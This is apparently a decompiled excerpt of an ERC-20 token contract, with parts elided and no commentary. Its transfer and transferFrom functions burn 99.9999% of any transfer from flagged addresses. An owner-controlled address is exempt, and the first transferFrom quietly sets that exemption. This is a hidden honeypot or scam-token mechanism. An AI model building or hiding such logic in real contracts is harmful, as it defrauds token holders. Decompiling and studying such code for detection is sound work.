...
function sub_abe8a3a8(?) {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    return sub_abe8a3a8Address
}
...
function sub_0c51294a(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_abe8a3a8Address = address(arg1)
    return 1
}
...
function transfer(address arg1, uint256 arg2) {
    ...
    if arg1 != sub_abe8a3a8Address:
        ...
        if bool(stor3[address(msg.sender)]) == 1:
            ...
            if arg2 and 999999 > -1 / arg2:
                revert with 'NH{q', 17
            if arg2 and 1 > -1 / arg2:
                revert with 'NH{q', 17
            if balanceOf[0] > -(999999 * arg2 / 10^6) - 1:
                revert with 'NH{q', 17
            balanceOf[0] += 999999 * arg2 / 10^6
            if balanceOf[address(arg1)] > -(arg2 / 10^6) - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg1)] += arg2 / 10^6
            emit Transfer((999999 * arg2 / 10^6), msg.sender, 0);
            emit Transfer((arg2 / 10^6), msg.sender, arg1);
    return 1
}
...
function transferFrom(address arg1, address arg2, uint256 arg3) {
    ...
    if arg2 != sub_abe8a3a8Address:
        ...
        if bool(stor3[address(arg1)]) == 1:
            ...
            if arg3 and 999999 > -1 / arg3:
                revert with 'NH{q', 17
            if arg3 and 1 > -1 / arg3:
                revert with 'NH{q', 17
            if balanceOf[0] > -(999999 * arg3 / 10^6) - 1:
                revert with 'NH{q', 17
            balanceOf[0] += 999999 * arg3 / 10^6
            if balanceOf[address(arg2)] > -(arg3 / 10^6) - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)] += arg3 / 10^6
            emit Transfer((999999 * arg3 / 10^6), arg1, 0);
            emit Transfer((arg3 / 10^6), arg1, arg2);
    if arg1:
        if not sub_abe8a3a8Address:
            sub_abe8a3a8Address = arg2
